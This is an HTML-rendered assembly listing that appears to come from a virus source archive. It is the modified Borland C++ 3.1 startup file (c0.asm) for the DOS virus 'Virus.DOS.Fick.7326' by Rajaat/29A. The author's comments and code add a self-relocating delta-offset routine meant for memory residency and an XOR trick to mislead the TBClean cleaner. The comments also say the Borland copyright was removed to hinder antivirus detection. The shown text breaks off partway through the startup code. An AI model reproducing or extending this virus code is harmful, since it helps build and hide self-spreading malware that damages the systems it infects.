<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Fick.7326 - c0.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;[]------------------------------------------------------------[]</span><span class="sc0">
</span><span class="sc1">;|      C0.ASM -- Start Up Code for DOS                         |</span><span class="sc0">
</span><span class="sc1">;[]------------------------------------------------------------[]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       C/C++ Run Time Library - Version 5.0</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       Copyright (c) 1987, 1992 by Borland International</span><span class="sc0">
</span><span class="sc1">;       All Rights Reserved.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;=====( Modifications by Rajaat / 29A )========================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I had to make some alterations to the startupcode of Borland C++ 3.1 in order</span><span class="sc0">
</span><span class="sc1">; to make my code work. I could not avoid this due to the design of the main</span><span class="sc0">
</span><span class="sc1">; code. If I would wanted to leave this part untouched I would have written a</span><span class="sc0">
</span><span class="sc1">; prepender.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I also removed some useless code, like the Borland copyright notice (since I</span><span class="sc0">
</span><span class="sc1">; think the av will undoubtly recognize this one as a HLL virus, they</span><span class="sc0">
</span><span class="sc1">; unfortunately missed it that Animo.518 also was a HLL virus), the</span><span class="sc0">
</span><span class="sc1">; checksumming code, the code that you can insert more startup code using the</span><span class="sc0">
</span><span class="sc1">; #pragma startup in the source, BIOS time in ticks, midnight time flag and</span><span class="sc0">
</span><span class="sc1">; some other things. Also I had to insert a call to the __setupio() code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Anyway, this file is a quick hack of the original code and may or may not be</span><span class="sc0">
</span><span class="sc1">; bug free or completely optimized, but since it is needed by the rest of the</span><span class="sc0">
</span><span class="sc1">; code I'll release it nonetheless.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For instructions how to compile this, check the main C source,</span><span class="sc0">
</span><span class="sc1">; NICKFITZ.C</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">

                </span><span class="sc5">locals</span><span class="sc0">

                </span><span class="sc5">__C0__</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0">         </span><span class="sc5">RULES.ASI</span><span class="sc0">

</span><span class="sc1">;       Segment and Group declarations</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_FARDATA</span><span class="sc0">        </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'FAR_DATA'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_FARBSS</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'FAR_BSS'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_INIT_</span><span class="sc0">          </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'INITDATA'</span><span class="sc0">
</span><span class="sc5">InitStart</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_INITEND_</span><span class="sc0">       </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'INITDATA'</span><span class="sc0">
</span><span class="sc5">InitEnd</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_EXIT_</span><span class="sc0">          </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'EXITDATA'</span><span class="sc0">
</span><span class="sc5">ExitStart</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_EXITEND_</span><span class="sc0">       </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'EXITDATA'</span><span class="sc0">
</span><span class="sc5">ExitEnd</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_CVTSEG</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_SCNSEG</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">__HUGE__</span><span class="sc0">
  </span><span class="sc5">_BSS</span><span class="sc0">          </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'BSS'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
  </span><span class="sc5">_BSSEND</span><span class="sc0">       </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'BSSEND'</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DGROUP</span><span class="sc0">

</span><span class="sc1">;       External References</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">_main</span><span class="sc4">:</span><span class="sc5">DIST</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc5">DIST</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">__nfile</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">__setupio</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">          </span><span class="sc1">;required!</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">__stklen</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">LDATA</span><span class="sc0">  </span><span class="sc9">EQ</span><span class="sc0">  </span><span class="sc5">false</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">__heaplen</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">SUBTTL</span><span class="sc0">  </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc5">Up</span><span class="sc0"> </span><span class="sc5">Code</span><span class="sc0">
        </span><span class="sc9">PAGE</span><span class="sc0">
</span><span class="sc1">;/*                                                     */</span><span class="sc0">
</span><span class="sc1">;/*-----------------------------------------------------*/</span><span class="sc0">
</span><span class="sc1">;/*                                                     */</span><span class="sc0">
</span><span class="sc1">;/*     Start Up Code                                   */</span><span class="sc0">
</span><span class="sc1">;/*     -------------                                   */</span><span class="sc0">
</span><span class="sc1">;/*                                                     */</span><span class="sc0">
</span><span class="sc1">;/*-----------------------------------------------------*/</span><span class="sc0">
</span><span class="sc1">;/*                                                     */</span><span class="sc0">
</span><span class="sc5">PSPHigh</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00002h</span><span class="sc0">
</span><span class="sc5">PSPEnv</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0002ch</span><span class="sc0">
</span><span class="sc5">PSPCmd</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00080h</span><span class="sc0">

                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">__AHINCR</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">__AHSHIFT</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_DSEG</span><span class="sc0">

                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_exit</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_abort</span><span class="sc0">

                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">__terminate</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">__checknull</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">__restorezero</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">__cleanup</span><span class="sc0">

</span><span class="sc5">__AHINCR</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">__AHSHIFT</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       At the start, DS and ES both point to the segment prefix.</span><span class="sc0">
</span><span class="sc1">;       SS points to the stack segment except in TINY model where</span><span class="sc0">
</span><span class="sc1">;       SS is equal to CS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">SEGMENT</span><span class="sc0">
                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">STARTX</span><span class="sc0">          </span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc10">NEAR</span><span class="sc0">
</span><span class="sc1">;       Save general information, such as :</span><span class="sc0">
</span><span class="sc1">;               DGROUP segment address</span><span class="sc0">
</span><span class="sc1">;               DOS version number</span><span class="sc0">
</span><span class="sc1">;               Program Segment Prefix address</span><span class="sc0">
</span><span class="sc1">;               Environment address</span><span class="sc0">
</span><span class="sc1">;               Top of far heap</span><span class="sc0">

</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">virus_start</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc4">&gt;,</span><span class="sc0">   </span><span class="sc5">__CDECL__</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">                 </span><span class="sc1">; get delta offset for the</span><span class="sc0">
</span><span class="sc5">get_offset</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; relocator.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_pspseg</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; store PSP for C code</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                        </span><span class="sc1">; no delta offset?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_fixup</span><span class="sc0">                     </span><span class="sc1">; indeed, no alignment needed</span><span class="sc0">
                                                </span><span class="sc1">; jump to no_fixup</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">_virus_start</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; this part relocates the whole</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">_virus_end</span><span class="sc0">               </span><span class="sc1">; code so that it gets aligned</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; at a paragraph. this gets</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; calculated in such way that</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; whereever the code may reside</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">                          </span><span class="sc1">; it always is located at</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; CS:100h, just like the</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">; compiled original. this also</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; makes it ideal for memory</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; residency.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">_virus_end</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">                             </span><span class="sc1">; we move in backwards fashion</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; to prevent overwriting our</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; own code</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">; we now jump back to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0deadh</span><span class="sc0">          </span><span class="sc1">; relocated relocator (wow!</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">                   </span><span class="sc1">; did we jump to the original</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; program, tbclean?) which</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; sees that we are aligned and</span><span class="sc0">
                                                </span><span class="sc1">; will eventually end at</span><span class="sc0">
                                                </span><span class="sc1">; no_fixup</span><span class="sc0">

</span><span class="sc5">no_fixup</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; i clean some segments here,</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; C would probably require it</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_pspseg</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;=====( Comments from Rajaat )=================================================</span><span class="sc0">
</span><span class="sc1">; From here on I've cutted out some Borland code, but I left their comments in.</span><span class="sc0">
</span><span class="sc1">; Excuse me if it looks a bit confusing, but it's just a stripped version of</span><span class="sc0">
</span><span class="sc1">; the normal Borland C++ 3.1 startup code.</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_psp@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Keep Program Segment Prefix address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; DX = GROUP Segment address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DGROUP@@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;  __BOSS__</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; get DOS version number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PSPHigh</span><span class="sc4">]</span><span class="sc1">; BP = Highest Memory Segment Addr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PSPEnv</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; BX = Environment Segment address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_version@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Keep major and minor version number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_envseg@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Keep Environment Segment address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_heaptop@</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc1">;       Count the number of environment variables and compute the size.</span><span class="sc0">
</span><span class="sc1">;       Each variable is ended by a 0 and a zero-length variable stops</span><span class="sc0">
</span><span class="sc1">;       the environment. The environment can NOT be greater than 32k.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_envseg@</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07FFFh</span><span class="sc0">      </span><span class="sc1">; Environment cannot be &gt; 32 Kbytes</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">@@EnvLoop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">InitFailed</span><span class="sc0">      </span><span class="sc1">; Bad environment !!!</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; BX = Nb environment variables</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@EnvLoop</span><span class="sc0">       </span><span class="sc1">; Next variable ...</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000000b</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_envLng@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">    </span><span class="sc1">; Save Environment size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dPtrSize</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dPtrSize</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">dPtrSize</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_envSize@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; Save Environment Variables Nb.</span><span class="sc0">

</span><span class="sc1">;       Reset uninitialized data area</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DGROUP@@</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">bdata@</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">edata@</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;   If default number of file handles have changed then tell DOS</span><span class="sc0">

</span><span class="sc1">;       Prepare main arguments</span><span class="sc0">

</span><span class="sc1">;=====( I commented this out, if you really want it just remove the comments )=</span><span class="sc0">
</span><span class="sc1">;               mov     ah, 0</span><span class="sc0">
</span><span class="sc1">;               int     1ah                     ; get current BIOS time in ticks</span><span class="sc0">
</span><span class="sc1">;               mov     word ptr _StartTime@,dx ; save it for clock() fn</span><span class="sc0">
</span><span class="sc1">;               mov     word ptr _StartTime@+2,cx</span><span class="sc0">
</span><span class="sc1">;               or      al,al                   ; was midnight flag set?</span><span class="sc0">
</span><span class="sc1">;               jz      @@NotMidnight</span><span class="sc0">
</span><span class="sc1">;               mov     ax,40h                  ; set BIOS midnight flag</span><span class="sc0">
</span><span class="sc1">;               mov     es,ax                   ;  at 40:70</span><span class="sc0">
</span><span class="sc1">;               mov     bx,70h</span><span class="sc0">
</span><span class="sc1">;               mov     byte ptr es:[bx],1</span><span class="sc0">

</span><span class="sc5">@@NotMidnight</span><span class="sc4">:</span><span class="sc0">
